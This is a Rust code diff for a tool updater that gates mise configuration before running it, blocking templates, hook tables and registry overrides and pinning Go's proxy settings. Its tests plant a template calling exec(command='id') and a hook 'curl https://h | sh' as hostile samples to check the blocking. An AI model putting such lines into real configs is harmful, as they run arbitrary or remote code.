@@ -587,15 +587,16 @@ fn mise_outdated(env: &Env, registry: &[(String, String)]) -> Result<Vec<Item>, 
         .collect())
 }
 
-/// The configuration files that `mise install` reads from the runner directory, as `mise config
-/// ls --json` lists them (`[{"path": .., ..}]`). The listing reads local files only.
+/// The configuration files that `mise config ls --json` lists (`[{"path": .., ..}]`), run with
+/// the runner, directory and environment of `mise install`. mise renders each file's templates
+/// to list it, so it runs only after every candidate file passed the gate.
 fn mise_files(env: &Env) -> Result<Vec<PathBuf>, String> {
     let why = |n: String| format!("cannot list the mise configuration files: {n}; nothing ran");
     let out = call(
         env.provider,
         "mise",
         &args(&["config", "ls", "--json"]),
-        &npm_env(&[]),
+        &mise_env(&[]),
         env.timeouts.short,
     )
     .map_err(|(n, _)| why(n))?;
@@ -613,81 +614,177 @@ fn mise_files(env: &Env) -> Result<Vec<PathBuf>, String> {
         .collect()
 }
 
-/// The identities that the tools of the files `mise config ls` lists fetch from, as
-/// `source_identity` maps them: `github:` and `ubi:` take an `o/r`, `npm:` and `go:` stay as
-/// they are. A registry name and `core:` fetch from mise's own registry and need none. Each
-/// `Err` is a note that blocks the row: a listing that fails, a file that cannot be read or
-/// parsed, a backend that maps to no identity, and any configuration that can point a tool at
-/// another source (a `[plugins]`, `[tool_alias]` or `[alias]` entry, a tool option outside
-/// the allowlist, a setting other than `trusted_config_paths`, a non-empty `[env]`, or a
-/// lockfile beside a listed file).
-fn mise_identities(env: &Env) -> Vec<Result<String, String>> {
-    let files = match mise_files(env) {
-        Ok(f) => f,
-        Err(why) => return vec![Err(why)],
-    };
-    let mut ids = Vec::new();
-    // One note per lockfile, also when several listed files share its directory.
-    let mut locks = BTreeSet::new();
-    for file in files {
-        locks.extend(mise_locks(&file));
-        let at = file.display();
-        let text = match std::fs::read_to_string(&file) {
-            Ok(t) => t,
-            Err(e) => {
-                ids.push(Err(format!("cannot read {at}: {e}")));
-                continue;
-            }
-        };
-        if file.file_name().is_some_and(|n| n == ".tool-versions") {
-            for line in text.lines() {
-                let line = line.split_once('#').map_or(line, |(l, _)| l);
-                let mut words = line.split_whitespace();
-                match (words.next(), words.next()) {
-                    (None, _) => {}
-                    (Some(tool), Some(_)) => ids.extend(mise_tool(&file, tool, None)),
-                    (Some(tool), None) => {
-                        ids.push(Err(format!("{at}: the line for {tool} names no version")))
-                    }
-                }
-            }
-            continue;
+/// The files mise can read for the runner directory, found without running mise: in that
+/// directory and each parent up to `/`, `.tool-versions`, `mise*.toml` and `.mise*.toml`
+/// (`mise.toml`, `mise.local.toml`, `mise.<env>.toml`), `.config/mise*.toml`, and
+/// `config*.toml` and `mise*.toml` in `.config/mise/`, `.mise/` and `mise/` with every
+/// `conf.d/*.toml` there; then the same names in the global `~/.config/mise/` and the system
+/// `/etc/mise/`. A directory that cannot be listed is still probed for the fixed names; a file
+/// missed here is caught when `mise config ls` lists it.
+fn mise_candidates(env: &Env) -> BTreeSet<PathBuf> {
+    // (directory, name prefixes of its `.toml` files; empty is every `.toml` file)
+    type Dirs = Vec<(PathBuf, &'static [&'static str])>;
+    fn config_dir(d: PathBuf, dirs: &mut Dirs, fixed: &mut Vec<PathBuf>) {
+        fixed.push(d.join("config.toml"));
+        dirs.push((d.join("conf.d"), &[]));
+        dirs.push((d, &["config", "mise"]));
+    }
+    let mut dirs: Dirs = Vec::new();
+    let mut fixed = Vec::new();
+    for d in env.provider.cwd.ancestors() {
+        for name in [
+            ".tool-versions",
+            "mise.toml",
+            ".mise.toml",
+            "mise.local.toml",
+            ".mise.local.toml",
+            ".config/mise.toml",
+        ] {
+            fixed.push(d.join(name));
         }
-        let doc: toml::Table = match text.parse() {
-            Ok(d) => d,
-            Err(e) => {
-                ids.push(Err(format!("{at}: {e}")));
-                continue;
-            }
-        };
-        for table in ["plugins", "tool_alias", "alias"] {
-            if doc
-                .get(table)
-                .is_some_and(|t| t.as_table().is_none_or(|t| !t.is_empty()))
-            {
-                ids.push(Err(format!(
-                    "{at}: the [{table}] table can point a tool at another source; remove it"
-                )));
-            }
-        }
-        if doc
-            .get("env")
-            .is_some_and(|t| t.as_table().is_none_or(|t| !t.is_empty()))
-        {
-            ids.push(Err(format!(
-                "{at}: the [env] table reaches the commands mise runs to fetch, such as npm_config_registry or GOPROXY; remove it"
-            )));
-        }
-        if let Some(settings) = doc.get("settings").and_then(|t| t.as_table()) {
-            mise_settings(&file, "settings", settings, &mut ids);
-        }
-        let tools = doc.get("tools").and_then(|t| t.as_table());
-        for (key, value) in tools.into_iter().flatten() {
-            ids.extend(mise_tool(&file, key, Some(value)));
+        dirs.push((d.to_path_buf(), &["mise", ".mise"]));
+        dirs.push((d.join(".config"), &["mise"]));
+        for sub in [".config/mise", ".mise", "mise"] {
+            config_dir(d.join(sub), &mut dirs, &mut fixed);
         }
     }
+    config_dir(env.home.join(".config/mise"), &mut dirs, &mut fixed);
+    config_dir(PathBuf::from("/etc/mise"), &mut dirs, &mut fixed);
+    let mut out: BTreeSet<PathBuf> = fixed.into_iter().filter(|p| p.is_file()).collect();
+    for (dir, prefixes) in dirs {
+        let Ok(entries) = std::fs::read_dir(&dir) else {
+            continue;
+        };
+        for e in entries.filter_map(Result::ok) {
+            let name = e.file_name();
+            let name = name.to_string_lossy();
+            if name.ends_with(".toml")
+                && (prefixes.is_empty() || prefixes.iter().any(|p| name.starts_with(p)))
+                && e.path().is_file()
+            {
+                out.insert(e.path());
+            }
+        }
+    }
+    out
+}
+
+/// The identities that the tools of the mise configuration fetch from, as `source_identity`
+/// maps them: `github:` and `ubi:` take an `o/r`, `npm:` and `go:` stay as they are. A registry
+/// name and `core:` fetch from mise's own registry and need none. Every file of
+/// [`mise_candidates`] is read before mise runs. Each `Err` is a note that blocks the row: a
+/// file that cannot be read or parsed, a template (`{{`, `{%`, `{#`), which mise would render
+/// and which can run a command, a non-empty `[hooks]` table, a backend that maps to no
+/// identity, and any configuration that can point a tool at another source (a `[plugins]`,
+/// `[tool_alias]` or `[alias]` entry, a tool option outside the allowlist, a setting other than
+/// `trusted_config_paths`, a non-empty `[env]`, or a lockfile beside a file). Only when every
+/// file passes and every identity has a grant does `mise config ls --json` run; a listing that
+/// fails, or a path it lists that is not a candidate, is a note too.
+fn mise_identities(env: &Env) -> Vec<Result<String, String>> {
+    let candidates = mise_candidates(env);
+    let mut ids = Vec::new();
+    // One note per lockfile, also when several files share its directory.
+    let mut locks = BTreeSet::new();
+    for file in &candidates {
+        locks.extend(mise_locks(file));
+        mise_gate_file(file, &mut ids);
+    }
     ids.extend(locks.into_iter().map(Err));
+    if ids
+        .iter()
+        .any(|id| id.as_ref().map_or(true, |id| !env.grants.trusts(id)))
+    {
+        return ids;
+    }
+    let canonical: BTreeSet<PathBuf> = candidates
+        .iter()
+        .filter_map(|p| p.canonicalize().ok())
+        .collect();
+    match mise_files(env) {
+        Err(why) => ids.push(Err(why)),
+        Ok(listed) => ids.extend(
+            listed
+                .into_iter()
+                .filter(|p| {
+                    !candidates.contains(p)
+                        && !p.canonicalize().is_ok_and(|c| canonical.contains(&c))
+                })
+                .map(|p| {
+                    Err(format!(
+                        "mise config ls --json lists {}, which dfm did not read before running mise; nothing was installed",
+                        p.display()
+                    ))
+                }),
+        ),
+    }
     ids
+}
+
+/// Reads one mise configuration file into `ids`: its identities and the notes that block.
+fn mise_gate_file(file: &Path, ids: &mut Vec<Result<String, String>>) {
+    let at = file.display();
+    let text = match std::fs::read_to_string(file) {
+        Ok(t) => t,
+        Err(e) => {
+            ids.push(Err(format!("cannot read {at}: {e}")));
+            return;
+        }
+    };
+    if ["{{", "{%", "{#"].iter().any(|t| text.contains(t)) {
+        ids.push(Err(format!(
+            "{at}: a template ({{{{, {{% or {{#), which mise renders and which can run a command; remove it"
+        )));
+        return;
+    }
+    if file.file_name().is_some_and(|n| n == ".tool-versions") {
+        for line in text.lines() {
+            let line = line.split_once('#').map_or(line, |(l, _)| l);
+            let mut words = line.split_whitespace();
+            match (words.next(), words.next()) {
+                (None, _) => {}
+                (Some(tool), Some(_)) => ids.extend(mise_tool(file, tool, None)),
+                (Some(tool), None) => {
+                    ids.push(Err(format!("{at}: the line for {tool} names no version")))
+                }
+            }
+        }
+        return;
+    }
+    let doc: toml::Table = match text.parse() {
+        Ok(d) => d,
+        Err(e) => {
+            ids.push(Err(format!("{at}: {e}")));
+            return;
+        }
+    };
+    let filled = |k: &str| {
+        doc.get(k)
+            .is_some_and(|t| t.as_table().is_none_or(|t| !t.is_empty()))
+    };
+    for table in ["plugins", "tool_alias", "alias"] {
+        if filled(table) {
+            ids.push(Err(format!(
+                "{at}: the [{table}] table can point a tool at another source; remove it"
+            )));
+        }
+    }
+    if filled("hooks") {
+        ids.push(Err(format!(
+            "{at}: the [hooks] table runs commands around mise install; remove it"
+        )));
+    }
+    if filled("env") {
+        ids.push(Err(format!(
+            "{at}: the [env] table reaches the commands mise runs to fetch, such as npm_config_registry or GOPROXY; remove it"
+        )));
+    }
+    if let Some(settings) = doc.get("settings").and_then(|t| t.as_table()) {
+        mise_settings(file, "settings", settings, ids);
+    }
+    let tools = doc.get("tools").and_then(|t| t.as_table());
+    for (key, value) in tools.into_iter().flatten() {
+        ids.extend(mise_tool(file, key, Some(value)));
+    }
 }
 
 /// One note per lockfile mise can pair with `file`: in its directory (and, for a `conf.d`
@@ -809,12 +906,72 @@ fn mise_tool(file: &Path, key: &str, value: Option<&toml::Value>) -> Vec<Result<
     ids
 }
 
+/// The environment of every mise command: [`npm_env`] for `npm`, and Go at its defaults, so
+/// neither Go's own env file (`go env -w`, read although the runner clears the environment)
+/// nor a toolchain switch moves a `go:` fetch: the public proxy and checksum database, no
+/// private or insecure module patterns, no flags.
+fn mise_env(npm: &[String]) -> Vec<(String, String)> {
+    let mut v = npm_env(npm);
+    v.extend(
+        [
+            ("GOENV", "off"),
+            ("GOFLAGS", ""),
+            ("GOPROXY", "https://proxy.golang.org,direct"),
+            ("GOSUMDB", "sum.golang.org"),
+            ("GONOSUMDB", ""),
+            ("GONOSUMCHECK", ""),
+            ("GOPRIVATE", ""),
+            ("GONOPROXY", ""),
+            ("GOINSECURE", ""),
+            ("GOTOOLCHAIN", "local"),
+        ]
+        .map(|(k, v)| (k.to_string(), v.to_string())),
+    );
+    v
+}
+
+/// Each installed `(tool, version)`, from `mise ls --installed --json`: an object keyed by tool
+/// name, each an array of records with `version` (and `installed`, never `false` here). It
+/// reads the install directory and fetches nothing.
+fn mise_installed(
+    env: &Env,
+    menv: &[(String, String)],
+) -> Result<BTreeSet<(String, String)>, (String, bool)> {
+    let out = call(
+        env.provider,
+        "mise",
+        &args(&["ls", "--installed", "--json"]),
+        menv,
+        env.timeouts.short,
+    )?;
+    let bad = |why: &str| (format!("mise ls --installed --json: {why}"), false);
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).map_err(|_| bad("not JSON"))?;
+    let mut set = BTreeSet::new();
+    for (tool, versions) in v.as_object().ok_or_else(|| bad("not an object"))? {
+        for r in versions
+            .as_array()
+            .ok_or_else(|| bad("a tool is not a list"))?
+        {
+            if r.get("installed").and_then(|i| i.as_bool()) == Some(false) {
+                continue;
+            }
+            let version = r
+                .get("version")
+                .and_then(|x| x.as_str())
+                .ok_or_else(|| bad("a record has no version"))?;
+            set.insert((tool.clone(), version.to_string()));
+        }
+    }
+    Ok(set)
+}
+
 /// `mise install` for the configured tools that are missing, then `mise upgrade` without
 /// `--bump`: the newest version inside each configured range, so no configuration file is
 /// written. A tool or setting that [`mise_identities`] does not clear blocks the row before
-/// any command that fetches. Every mise command uses the default npm registry, for each
-/// `npm:@scope` too, so an `npm:` grant covers that registry only. mise removes the replaced
-/// version after its own grace period (`upgrade.prune_after`).
+/// any mise command. Every mise command gets [`mise_env`], so an `npm:` grant covers the
+/// default npm registry only and a `go:` grant the public Go proxy. Each tool version the
+/// install adds is a note, and makes the row `updated`. mise removes the replaced version
+/// after its own grace period (`upgrade.prune_after`).
 fn mise(mut d: Draft, env: &Env) -> Row {
     if let Err(e) = env.provider.resolve("mise") {
         d.notes.push(e.detail);
@@ -830,17 +987,30 @@ fn mise(mut d: Draft, env: &Env) -> Row {
         d.notes.extend(untrusted);
         return d.end(Status::Blocked);
     }
-    let registry = npm_env(&npm);
+    let menv = mise_env(&npm);
+    let had = match mise_installed(env, &menv) {
+        Ok(s) => s,
+        Err(e) => return d.stop(e),
+    };
     if let Err(e) = call(
         env.provider,
         "mise",
         &args(&["install"]),
-        &registry,
+        &menv,
         env.timeouts.long,
     ) {
         return d.stop(e);
     }
-    let list = || mise_outdated(env, &registry);
+    let has = match mise_installed(env, &menv) {
+        Ok(s) => s,
+        Err(e) => return d.stop(e),
+    };
+    let added = has.difference(&had).count();
+    d.notes.extend(
+        has.difference(&had)
+            .map(|(tool, version)| format!("{tool} {version} installed")),
+    );
+    let list = || mise_outdated(env, &menv);
     let before = match list() {
         Ok(l) => l,
         Err(e) => return d.stop(e),
@@ -850,11 +1020,15 @@ fn mise(mut d: Draft, env: &Env) -> Row {
             env.provider,
             "mise",
             &args(&["upgrade"]),
-            &registry,
+            &menv,
             env.timeouts.long,
         )
     };
-    roll(d, "mise upgrade", before, &upgrade, &list)
+    let mut row = roll(d, "mise upgrade", before, &upgrade, &list);
+    if added > 0 && row.status == Status::Current {
+        row.status = Status::Updated;
+    }
+    row
 }
 
 /// `rustup check`: one line per toolchain and one for rustup itself, `<name> - update
@@ -1704,7 +1878,7 @@ fn preview_command(u: Updater, env: &Env) -> String {
         },
         Updater::Mise => match env.provider.resolve("mise") {
             Ok(p) => format!(
-                "would run mise config ls --json, mise install, mise outdated --json, mise upgrade ({})",
+                "would run mise config ls --json, mise ls --installed --json, mise install, mise outdated --json, mise upgrade ({})",
                 p.display()
             ),
             Err(e) => format!("blocked: {}", e.detail),
@@ -1797,7 +1971,8 @@ mod tests {
             let runner = Runner {
                 search_path: vec![bin.clone(), "/usr/bin".into(), "/bin".into()],
                 home: home.clone(),
-                cwd: root.join("run"),
+                // Under HOME, as the real one is, so HOME is a parent mise reads.
+                cwd: home.join(".cache/dotfiles-manager/run"),
                 uid,
                 grace: Duration::from_millis(200),
                 detach: false,
@@ -2807,16 +2982,18 @@ mod tests {
 
     impl T {
         /// `mise` whose `config ls --json` lists each path in `st/mise-files` (and exits 1 with
-        /// `st/mise-config-fail`), whose `outdated --json` prints `st/mise-outdated` and whose
-        /// bare `upgrade` replaces it with `st/mise-after`. Any other upgrade form (`--bump`, a
-        /// name) exits 65, and so does `install` with an argument. Each call appends its first
-        /// argument and its `npm_config_` variables to `st/mise-env`.
+        /// `st/mise-config-fail`), whose `ls --installed --json` prints `st/mise-ls` (`{}` when
+        /// absent), whose `install` copies `st/mise-ls-after` over it when that exists, whose
+        /// `outdated --json` prints `st/mise-outdated` and whose bare `upgrade` replaces it with
+        /// `st/mise-after`. Any other upgrade form (`--bump`, a name) exits 65, and so does
+        /// `install` with an argument. Each call appends its first argument and its
+        /// `npm_config_` and `GO` variables to `st/mise-env`.
         fn mise(&self, outdated: &str, after: &str) {
             fs::write(self.root.join("st/mise-outdated"), outdated).unwrap();
             fs::write(self.root.join("st/mise-after"), after).unwrap();
             self.script(
                 &self.bin.join("mise"),
-                "printf '%s ' \"$1\" >> \"$st/mise-env\"; env | grep '^npm_config_' | sort | tr '\\n' ' ' >> \"$st/mise-env\"; echo >> \"$st/mise-env\"\ncase \"$1\" in\n  config) [ \"$2 $3\" = 'ls --json' ] || exit 65; [ -f \"$st/mise-config-fail\" ] && exit 1; printf '['; sep=; [ -f \"$st/mise-files\" ] && while read -r p; do printf '%s{\"path\":\"%s\",\"tools\":[],\"override\":false}' \"$sep\" \"$p\"; sep=,; done < \"$st/mise-files\"; echo ']' ;;\n  install) [ -z \"$2\" ] || exit 65 ;;\n  outdated) cat \"$st/mise-outdated\" ;;\n  upgrade) [ -z \"$2\" ] || exit 65; cp \"$st/mise-after\" \"$st/mise-outdated\" ;;\n  *) exit 64 ;;\nesac",
+                "printf '%s ' \"$1\" >> \"$st/mise-env\"; env | grep -E '^(npm_config_|GO)' | sort | tr '\\n' ' ' >> \"$st/mise-env\"; echo >> \"$st/mise-env\"\ncase \"$1\" in\n  config) [ \"$2 $3\" = 'ls --json' ] || exit 65; [ -f \"$st/mise-config-fail\" ] && exit 1; printf '['; sep=; [ -f \"$st/mise-files\" ] && while read -r p; do printf '%s{\"path\":\"%s\",\"tools\":[],\"override\":false}' \"$sep\" \"$p\"; sep=,; done < \"$st/mise-files\"; echo ']' ;;\n  ls) [ \"$2 $3\" = '--installed --json' ] || exit 65; cat \"$st/mise-ls\" 2>/dev/null || echo '{}' ;;\n  install) [ -z \"$2\" ] || exit 65; [ -f \"$st/mise-ls-after\" ] && cp \"$st/mise-ls-after\" \"$st/mise-ls\"; exit 0 ;;\n  outdated) cat \"$st/mise-outdated\" ;;\n  upgrade) [ -z \"$2\" ] || exit 65; cp \"$st/mise-after\" \"$st/mise-outdated\" ;;\n  *) exit 64 ;;\nesac",
             );
         }
 
@@ -2916,7 +3093,9 @@ mod tests {
             t.calls(),
             vec![
                 "mise config ls --json".to_string(),
+                "mise ls --installed --json".to_string(),
                 "mise install".to_string(),
+                "mise ls --installed --json".to_string(),
                 "mise outdated --json".to_string(),
                 "mise upgrade".to_string(),
                 "mise outdated --json".to_string()
@@ -2937,7 +3116,9 @@ mod tests {
             t.calls(),
             [
                 "mise config ls --json",
+                "mise ls --installed --json",
                 "mise install",
+                "mise ls --installed --json",
                 "mise outdated --json",
                 "mise upgrade",
                 "mise outdated --json"
@@ -2945,7 +3126,7 @@ mod tests {
         );
         assert!(
             preview(Updater::Mise, &t.env())
-                .starts_with("would run mise config ls --json, mise install, mise outdated"),
+                .starts_with("would run mise config ls --json, mise ls --installed --json, mise install, mise outdated"),
             "{}",
             preview(Updater::Mise, &t.env())
         );
@@ -2968,7 +3149,8 @@ mod tests {
                 .all(|n| n.starts_with("E_SOURCE_UNTRUSTED: no grant for ")),
             "{r:?}"
         );
-        assert_eq!(t.calls(), ["mise config ls --json"]);
+        // An ungranted identity stops the gate before any mise command, the listing included.
+        assert!(t.calls().is_empty(), "{:?}", t.calls());
         assert!(preview(Updater::Mise, &t.env()).starts_with("blocked: E_SOURCE_UNTRUSTED"));
     }
 
@@ -2987,7 +3169,14 @@ mod tests {
         }
         let r = run(Updater::Mise, &t.env());
         assert_eq!(r.status, Status::Updated, "{r:?}");
-        assert_eq!(t.calls()[..2], ["mise config ls --json", "mise install"]);
+        assert_eq!(
+            t.calls()[..3],
+            [
+                "mise config ls --json",
+                "mise ls --installed --json",
+                "mise install"
+            ]
+        );
     }
 
     #[test]
@@ -3025,12 +3214,19 @@ mod tests {
         assert_eq!(r.status, Status::Blocked, "{r:?}");
         assert_eq!(r.notes.len(), 1, "{r:?}");
         assert!(r.notes[0].contains("config.toml"), "{r:?}");
-        assert_eq!(t.calls(), ["mise config ls --json"]);
+        assert!(t.calls().is_empty(), "{:?}", t.calls());
     }
 
-    /// Blocks the mise row and returns its notes, after checking that only the local listing
-    /// ran.
+    /// Blocks the mise row and returns its notes, after checking that no mise command ran.
     fn mise_blocked(t: &T) -> Vec<String> {
+        let r = run(Updater::Mise, &t.env());
+        assert_eq!(r.status, Status::Blocked, "{r:?}");
+        assert!(t.calls().is_empty(), "{:?}", t.calls());
+        r.notes
+    }
+
+    /// Blocks the mise row after `mise config ls --json` and returns its notes.
+    fn mise_blocked_after_the_listing(t: &T) -> Vec<String> {
         let r = run(Updater::Mise, &t.env());
         assert_eq!(r.status, Status::Blocked, "{r:?}");
         assert_eq!(t.calls(), ["mise config ls --json"]);
@@ -3063,7 +3259,7 @@ mod tests {
         t.mise(MISE_TWO, "{}");
         let gone = t.home.join("gone/mise.toml");
         t.mise_list(&gone);
-        let notes = mise_blocked(&t);
+        let notes = mise_blocked_after_the_listing(&t);
         assert_eq!(notes.len(), 1, "{notes:?}");
         assert!(notes[0].contains(&gone.display().to_string()), "{notes:?}");
         let t = T::new();
@@ -3074,7 +3270,7 @@ mod tests {
         let t = T::new();
         t.mise(MISE_TWO, "{}");
         fs::write(t.root.join("st/mise-config-fail"), "").unwrap();
-        let notes = mise_blocked(&t);
+        let notes = mise_blocked_after_the_listing(&t);
         assert_eq!(notes.len(), 1, "{notes:?}");
         assert!(notes[0].contains("mise config ls --json"), "{notes:?}");
     }
@@ -3179,6 +3375,119 @@ mod tests {
     }
 
     #[test]
+    fn mise_with_a_template_in_a_candidate_file_runs_no_mise_command() {
+        for (rel, body) in [
+            (
+                ".config/mise/config.toml",
+                "[tools]\nnode = \"{{ exec(command='id') }}\"\n",
+            ),
+            ("mise.toml", "{% set x = 1 %}\n[tools]\n"),
+            (".tool-versions", "node 22 {# note #}\n"),
+        ] {
+            let t = T::new();
+            t.mise(MISE_TWO, "{}");
+            // Written but not listed: the gate finds it without asking mise.
+            let path = t.home.join(rel);
+            fs::create_dir_all(path.parent().unwrap()).unwrap();
+            fs::write(&path, body).unwrap();
+            let notes = mise_blocked(&t);
+            assert_eq!(notes.len(), 1, "{rel}: {notes:?}");
+            assert!(
+                notes[0].contains(&path.display().to_string()) && notes[0].contains("template"),
+                "{rel}: {notes:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn mise_with_a_hooks_table_is_blocked() {
+        let t = T::new();
+        t.mise(MISE_TWO, "{}");
+        t.mise_config(
+            "config.toml",
+            "[hooks]\npostinstall = \"curl https://h | sh\"\n",
+        );
+        t.mise_config("conf.d/empty.toml", "[hooks]\n");
+        let notes = mise_blocked(&t);
+        assert_eq!(notes.len(), 1, "{notes:?}");
+        assert!(
+            notes[0].contains("config.toml") && notes[0].contains("[hooks]"),
+            "{notes:?}"
+        );
+    }
+
+    #[test]
+    fn mise_listing_a_file_the_gate_did_not_read_is_blocked_before_the_install() {
+        let t = T::new();
+        t.mise(MISE_TWO, "{}");
+        // A file mise reads from a place the candidate set does not hold.
+        let other = t.root.join("elsewhere/mise.toml");
+        t.mise_file(&other, "[tools]\nnode = \"22\"\n");
+        let notes = mise_blocked_after_the_listing(&t);
+        assert_eq!(notes.len(), 1, "{notes:?}");
+        assert!(notes[0].contains(&other.display().to_string()), "{notes:?}");
+    }
+
+    #[test]
+    fn mise_commands_pin_go_to_its_defaults() {
+        let t = T::new();
+        t.mise(MISE_TWO, "{}");
+        let r = run(Updater::Mise, &t.env());
+        assert_eq!(r.status, Status::Updated, "{r:?}");
+        let env = t.mise_env();
+        for cmd in ["config", "ls", "install", "outdated", "upgrade"] {
+            let line = env
+                .lines()
+                .find(|l| l.starts_with(&format!("{cmd} ")))
+                .unwrap_or_else(|| panic!("{cmd}: {env}"));
+            for var in [
+                "GOENV=off ",
+                "GOFLAGS= ",
+                "GOPROXY=https://proxy.golang.org,direct ",
+                "GOSUMDB=sum.golang.org ",
+                "GONOSUMDB= ",
+                "GONOSUMCHECK= ",
+                "GOPRIVATE= ",
+                "GONOPROXY= ",
+                "GOINSECURE= ",
+                "GOTOOLCHAIN=local ",
+            ] {
+                assert!(line.contains(var), "{cmd} {var}: {line}");
+            }
+        }
+    }
+
+    #[test]
+    fn mise_installing_a_missing_tool_is_updated_although_nothing_is_outdated() {
+        let t = T::new();
+        t.mise("{}", "{}");
+        fs::write(
+            t.root.join("st/mise-ls"),
+            r#"{"go":[{"version":"1.27.3","installed":true}]}"#,
+        )
+        .unwrap();
+        fs::write(
+            t.root.join("st/mise-ls-after"),
+            r#"{"go":[{"version":"1.27.3","installed":true}],"node":[{"version":"22.1.0","installed":true}]}"#,
+        )
+        .unwrap();
+        let r = run(Updater::Mise, &t.env());
+        assert_eq!(r.status, Status::Updated, "{r:?}");
+        assert_eq!(r.notes, ["node 22.1.0 installed"]);
+        // A listing that is not JSON stops the row as failed, before the install.
+        let t = T::new();
+        t.mise("{}", "{}");
+        fs::write(t.root.join("st/mise-ls"), "mise ERROR").unwrap();
+        let r = run(Updater::Mise, &t.env());
+        assert_eq!(r.status, Status::Failed, "{r:?}");
+        assert!(
+            !t.calls().contains(&"mise install".to_string()),
+            "{:?}",
+            t.calls()
+        );
+    }
+
+    #[test]
     fn mise_install_and_upgrade_use_the_default_npm_registry_for_each_scope() {
         let mut t = T::new();
         t.mise(MISE_TWO, "{}");
@@ -3215,7 +3524,9 @@ mod tests {
             t.calls(),
             vec![
                 "mise config ls --json".to_string(),
+                "mise ls --installed --json".to_string(),
                 "mise install".to_string(),
+                "mise ls --installed --json".to_string(),
                 "mise outdated --json".to_string()
             ]
         );
